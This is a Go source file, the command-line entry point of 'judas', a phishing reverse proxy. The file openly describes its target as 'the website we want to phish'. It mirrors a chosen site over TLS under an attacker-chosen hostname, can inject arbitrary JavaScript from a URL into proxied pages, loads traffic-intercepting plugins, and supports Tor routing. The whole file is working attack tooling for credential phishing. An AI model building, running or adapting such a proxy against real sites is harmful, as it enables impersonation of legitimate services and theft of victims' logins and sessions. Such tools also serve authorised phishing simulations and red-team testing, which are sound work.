package main

import (
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"github.com/joncooperworks/judas"
	"io/ioutil"
	"log"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"strings"
)

var (
	targetURL           = flag.String("target", "", "The website we want to phish.")
	address             = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler      = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyURL            = flag.String("proxy", "", "Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.")
	javascriptURL       = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
	insecure            = flag.Bool("insecure", false, "Listen without TLS.")
	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
	proxyCACert 		= flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
	proxyCAKey 			= flag.String("proxy-ca-key", "", "Proxy CA key for signed requests")
	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
	pluginPaths         = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
)

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}

	if !*insecure && *sslHostname == "" {
		exitWithError("--ssl-hostname is required unless --insecure flag is enabled.")
	}
}

func main() {
	setupRequiredFlags()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	logger := log.New(os.Stdout, "judas: ", log.Ldate|log.Ltime|log.Llongfile)

	rootCAs, _ := x509.SystemCertPool()
	if rootCAs == nil {
		rootCAs = x509.NewCertPool()
	}
	if *proxyCACert != "" {
		proxyCACertFile, err := os.Open(*proxyCACert)
		if err != nil {
			logger.Fatal(err)
		}
		defer proxyCACertFile.Close()

		certs, err := ioutil.ReadAll(proxyCACertFile)
		if err != nil {
			logger.Fatal(err)
		}

		if ok := rootCAs.AppendCertsFromPEM(certs); !ok {
			logger.Fatalf("failed to trust custom CA certs from %s", *proxyCACert)
		}
	}

	var httpTransport http.RoundTripper = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: *insecure,
			RootCAs:            rootCAs,
		},
	}

	if *proxyURL != "" {
		proxy, err := url.Parse(*proxyURL)
		if err != nil {
			logger.Fatal(err)
		}

		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
	}

	transport := &judas.InterceptingTransport{
		RoundTripper: httpTransport,
		TargetURL:    u,
	}

	if *pluginPaths != "" {
		pluginFilePaths := strings.Split(*pluginPaths, ":")
		plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
		if err != nil {
			exitWithError(err.Error())
		}

		transport.Plugins = plugins
	}

	config := &judas.Config{
		TargetURL:     u,
		Logger:        logger,
		Transport:     transport,
		JavascriptURL: *javascriptURL,
	}
	phishingProxy := judas.New(config)

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	if err != nil {
		exitWithError(err.Error())
	}

	http.HandleFunc("/", phishingProxy.HandleRequests)

	if *insecure {
		listenAddr := fmt.Sprintf("http://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServe(*address, nil)
		if err != nil {
			log.Println(err)
		}
	} else {
		listenAddr := fmt.Sprintf("https://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServeTLS(*address, *proxyCACert, *proxyCAKey, nil)
		if err != nil {
			log.Println(err)
		}
	}
}
